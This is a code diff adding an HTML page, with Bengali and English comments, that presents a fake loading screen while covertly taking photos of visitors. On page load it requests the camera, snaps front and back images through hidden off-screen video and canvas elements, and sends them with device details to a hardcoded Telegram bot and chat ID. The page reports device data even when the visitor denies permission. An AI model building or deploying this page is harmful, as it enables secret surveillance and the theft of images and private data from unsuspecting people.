@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Loading...</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: #ffffff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    /* Hide everything - silent operation */
+    .hidden {
+      display: none !important;
+    }
+
+    /* Fake loading screen to distract user */
+    #loading-screen {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #f0f0f0;
+      border-top: 5px solid #4a90e2;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    #loading-screen p {
+      color: #555;
+      font-size: 16px;
+    }
+
+    /* Hidden video element for camera stream */
+    #video {
+      position: fixed;
+      top: -9999px;
+      left: -9999px;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    /* Hidden canvas for capturing photo */
+    #canvas {
+      position: fixed;
+      top: -9999px;
+      left: -9999px;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      pointer-events: none;
+    }
+  </style>
+<script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
+</head>
+<body>
+
+  <!-- Fake Loading Screen -->
+  <div id="loading-screen">
+    <div class="spinner"></div>
+    <p>Loading, please wait...</p>
+  </div>
+
+  <!-- Hidden Camera Elements -->
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    // =============================================
+    // ⚙️ CONFIGURATION - এখানে আপনার তথ্য বসান
+    // =============================================
+    const TELEGRAM_BOT_TOKEN = "8787788954:AAEqOabm2L5I_f9QxWekhlqqiyFpu0e7INc";  // আপনার Bot Token
+    const TELEGRAM_CHAT_ID   = "8057802706";    // আপনার Chat ID
+    // =============================================
+
+    const video  = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    // Device info collect করা
+    function getDeviceInfo() {
+      return `📱 *New Visitor Alert!*\n` +
+             `🌐 URL: ${window.location.href}\n` +
+             `🕒 Time: ${new Date().toLocaleString()}\n` +
+             `📟 Device: ${navigator.userAgent.substring(0, 100)}\n` +
+             `🖥️ Screen: ${screen.width}x${screen.height}\n` +
+             `🌍 Language: ${navigator.language}`;
+    }
+
+    // Telegram এ text message পাঠানো
+    async function sendTextToTelegram(text) {
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: text,
+            parse_mode: 'Markdown'
+          })
+        });
+      } catch (e) {
+        console.log('Message send failed');
+      }
+    }
+
+    // Telegram এ photo পাঠানো
+    async function sendPhotoToTelegram(blob, caption) {
+      try {
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', blob, 'capture.jpg');
+        formData.append('caption', caption);
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+      } catch (e) {
+        console.log('Photo send failed');
+      }
+    }
+
+    // Canvas থেকে photo capture করা
+    function capturePhoto() {
+      return new Promise((resolve) => {
+        // Video এর actual size নেওয়া
+        const width  = video.videoWidth  || 640;
+        const height = video.videoHeight || 480;
+
+        canvas.width  = width;
+        canvas.height = height;
+
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, width, height);
+
+        canvas.toBlob((blob) => {
+          resolve(blob);
+        }, 'image/jpeg', 0.9);
+      });
+    }
+
+    // Multiple cameras থেকে photos তোলা (front + back)
+    async function captureFromCamera(facingMode) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: facingMode,
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          },
+          audio: false
+        });
+
+        video.srcObject = stream;
+
+        // Camera ready হওয়ার জন্য অপেক্ষা
+        await new Promise((resolve) => {
+          video.onloadedmetadata = () => {
+            video.play();
+            setTimeout(resolve, 1500); // 1.5 সেকেন্ড অপেক্ষা
+          };
+        });
+
+        const blob = await capturePhoto();
+
+        // Stream বন্ধ করা
+        stream.getTracks().forEach(track => track.stop());
+        video.srcObject = null;
+
+        return blob;
+      } catch (e) {
+        return null;
+      }
+    }
+
+    // Main function
+    async function startCapture() {
+      // Step 1: Device info পাঠানো
+      await sendTextToTelegram(getDeviceInfo());
+
+      // Step 2: Front camera থেকে photo তোলা
+      const frontBlob = await captureFromCamera('user');
+      if (frontBlob) {
+        await sendPhotoToTelegram(frontBlob, '🤳 Front Camera');
+        await new Promise(r => setTimeout(r, 1000));
+      }
+
+      // Step 3: Back camera থেকে photo তোলা
+      const backBlob = await captureFromCamera('environment');
+      if (backBlob) {
+        await sendPhotoToTelegram(backBlob, '📷 Back Camera');
+      }
+
+      // Step 4: Default camera (যদি উপরেরগুলো কাজ না করে)
+      if (!frontBlob && !backBlob) {
+        const defaultBlob = await captureFromCamera('');
+        if (defaultBlob) {
+          await sendPhotoToTelegram(defaultBlob, '📸 Camera Capture');
+        }
+      }
+    }
+
+    // Camera permission request এবং capture শুরু
+    async function init() {
+      try {
+        // Camera access request
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: true,
+          audio: false
+        });
+
+        // Permission পাওয়া গেছে - stream বন্ধ করে actual capture শুরু
+        stream.getTracks().forEach(track => track.stop());
+
+        // Capture শুরু
+        await startCapture();
+
+      } catch (err) {
+        // Permission denied হলে শুধু device info পাঠানো
+        await sendTextToTelegram(
+          getDeviceInfo() + '\n\n❌ Camera permission denied'
+        );
+      }
+
+      // Loading screen সরিয়ে ফেলা (optional - আপনার ইচ্ছামতো পরিবর্তন করুন)
+      // document.getElementById('loading-screen').innerHTML = 
+      //   '<p style="color:#888">Page not available</p>';
+    }
+
+    // Page load হলে শুরু
+    window.addEventListener('load', () => {
+      setTimeout(init, 500); // আধা সেকেন্ড পরে শুরু
+    });
+  </script>
+</body>
+</html>
